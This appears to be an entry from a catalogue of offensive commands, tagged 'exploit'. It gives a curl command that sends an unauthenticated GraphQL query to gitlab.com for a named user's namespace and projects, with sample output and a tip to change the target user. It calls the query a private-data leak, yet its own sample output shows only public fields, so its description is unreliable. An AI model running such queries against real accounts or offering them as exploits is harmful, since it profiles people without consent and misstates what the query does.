---
data: >-
  curl 'https://gitlab.com/api/graphql' -H 'Content-Type: application/json'
  --data '{"query":"{namespace(fullPath:\"rpadovani\") {description\n
  requestAccessEnabled\n fullName\n fullPath\n id\n lfsEnabled\n name\n path\n
  visibility\n projects (includeSubgroups: true, ) {edges {node {id\n name\n
  archived\n visibility\n
  description}}}}}","variables":null,"operationName":null}'
tags:
  - graphql
  - exploit
  - query
type: command
output: >-
  {"data":{"namespace":{"description":"","requestAccessEnabled":true,"fullName":"rpadovani","fullPath":"rpadovani","id":"gid://gitlab/Namespace/18021","lfsEnabled":true,"name":"rpadovani","path":"rpadovani","visibility":"public","projects":{"edges":[{"node":{"id":"gid://gitlab/Project/11265641","name":"737-max-8","archived":false,"visibility":"public","description":"https://737max8.com"}}]}}}}
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:59.863Z'
id: cd376062-127a-4ff1-8d76-48df9c93d230
verified: false
validated: true
submitted: true
---
# curl-graphql-user-namespace-query

## Command

```bash
curl 'https://gitlab.com/api/graphql' -H 'Content-Type: application/json' --data '{"query":"{namespace(fullPath:\"rpadovani\") {description\n requestAccessEnabled\n fullName\n fullPath\n id\n lfsEnabled\n name\n path\n visibility\n projects (includeSubgroups: true, ) {edges {node {id\n name\n archived\n visibility\n description}}}}}","variables":null,"operationName":null}'
```

## Description

Sends an unauthenticated GraphQL query to leak private user namespace data in GitLab.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `'https://gitlab.com/api/graphql'` | GraphQL endpoint URL | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON content type | Yes |
| `--data '{"query":...}'` | GraphQL query payload with fullPath and fields | Yes |
| `"variables":null` | No variables used | No |
| `"operationName":null` | No named operation | No |

## Examples

### Basic Usage

```bash
curl 'https://gitlab.com/api/graphql' -H 'Content-Type: application/json' --data '{"query":"{namespace(fullPath:\"rpadovani\") {...}}","variables":null,"operationName":null}'
```

### Advanced Usage

Modify fullPath for different users; add more fields if needed.

## Expected Output

JSON with data.namespace containing leaked details like projects and visibility.

## Related

- [[Related Procedure]]
